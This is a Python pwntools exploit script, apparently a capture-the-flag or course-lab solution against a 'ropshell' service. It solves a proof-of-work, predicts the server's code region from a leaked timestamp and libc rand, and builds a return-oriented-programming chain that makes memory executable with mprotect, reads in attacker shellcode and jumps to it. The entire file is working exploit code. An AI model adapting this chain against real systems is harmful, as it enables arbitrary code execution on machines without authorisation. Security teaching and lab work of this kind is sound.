#!/usr/bin/env python3

import os
import sys
import time
import ctypes
from pwn import *

LEN_CODE = (10*0x10000)
libc = ctypes.CDLL('libc.so.6')

def solve_pow(r):
    msg = r.recvuntil(b'string S: ').decode()
    print(msg)
    prefix = msg.split("'")[1]
    print('=====================================================')
    print("Solving ...")
    for i in range(1000000000):
        h = hashlib.sha1((prefix + str(i)).encode()).hexdigest()
        if h[0:6] == '000000':
            solved = str(i).encode()
            print("string S =", solved)
            print("base64-encoded string S =", base64.b64encode(solved))
            print("sha1(P+decode(S)) =", h)
            break;
    print('=====================================================')
    r.send(base64.b64encode(solved))
    r.send('\n')

def generate_codeint(timestamp):
    codeint = []
    libc.srand(timestamp)
    for i in range(LEN_CODE // 4):
        codeint.append(ctypes.c_uint32((libc.rand()<<16) | (libc.rand() & 0xffff)).value)
    codeint[libc.rand() % (LEN_CODE // 4 - 1)] = 0xc3050f
    return codeint

def ROP(code_addr, code, inject_payload_size):
    # Syscall arguments are put in the registers rax, rdi, rsi, rdx, r10, r8 and r9, in that order.

    pop_rax = code_addr + code.find(asm("pop rax; ret;")) # gadget_len: 2
    pop_rdi = code_addr + code.find(asm("pop rdi; ret;")) # gadget_len: 2
    pop_rsi = code_addr + code.find(asm("pop rsi; ret;")) # gadget_len: 2
    pop_rdx = code_addr + code.find(asm("pop rdx; ret;")) # gadget_len: 2
    syscall = code_addr + code.find(asm("syscall; ret;")) # gadget_len: 3

    # syscall('SYS_mprotect', ctypes.c_void_p(code_addr).value, ctypes.c_size_t(LEN_CODE).value, 'PROT_READ | PROT_WRITE | PROT_EXEC')
    payload = p64(pop_rax)
    payload += p64(constants.SYS_mprotect)
    payload += p64(pop_rdi)
    payload += p64(ctypes.c_void_p(code_addr).value)
    payload += p64(pop_rsi)
    payload += p64(ctypes.c_size_t(LEN_CODE).value)
    payload += p64(pop_rdx)
    payload += p64(constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC)
    payload += p64(syscall)

    # syscall('SYS_read', 0, inject_start, inject_size)
    inject_addr = max(pop_rax, pop_rdi, pop_rsi, pop_rdx, syscall) + 3 # avoid overriding gadgets in code
    payload += p64(pop_rax)
    payload += p64(constants.SYS_read)
    payload += p64(pop_rdi)
    payload += p64(0)
    payload += p64(pop_rsi)
    payload += p64(inject_addr)
    payload += p64(pop_rdx)
    payload += p64(inject_payload_size)
    payload += p64(syscall)

    # jump to the injected_addr
    payload += p64(inject_addr)

    # syscall('SYS_exit', 37)
    payload += p64(pop_rax)
    payload += p64(constants.SYS_exit)
    payload += p64(pop_rdi)
    payload += p64(37)
    payload += p64(syscall)

    return payload

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("usage: {} asm-payload".format(sys.argv[0]))
        sys.exit(-1)

    if not os.path.exists(sys.argv[1]):
        print("file: {} not found".format(sys.argv[1]))
        sys.exit(-1)

    context.os = 'linux'
    context.arch = 'amd64'

    with open(sys.argv[1], 'r') as f:
        asm_payload = asm(f.read())

    r = process("./ropshell", shell=False)
    #r = remote("up23.zoolab.org", 10494)

    if type(r) != pwnlib.tubes.process.process:
        solve_pow(r)
        print(r.recvline().decode())

    msg = r.recvuntil(b'shell>').decode()
    print(msg)
    timestamp = int(msg.split("**")[1].split("is ")[1][:-1])
    code_addr = int(msg.split("**")[2].split("at ")[1][:-1], 16)

    codeint = generate_codeint(timestamp)
    stack_payload = ROP(code_addr, struct.pack("I"*len(codeint), *codeint), len(asm_payload))

    r.send(stack_payload)
    time.sleep(1)
    r.send(asm_payload)

    print(r.recvuntil(b'** CMD: terminated with exit code 37').decode())
    r.close()
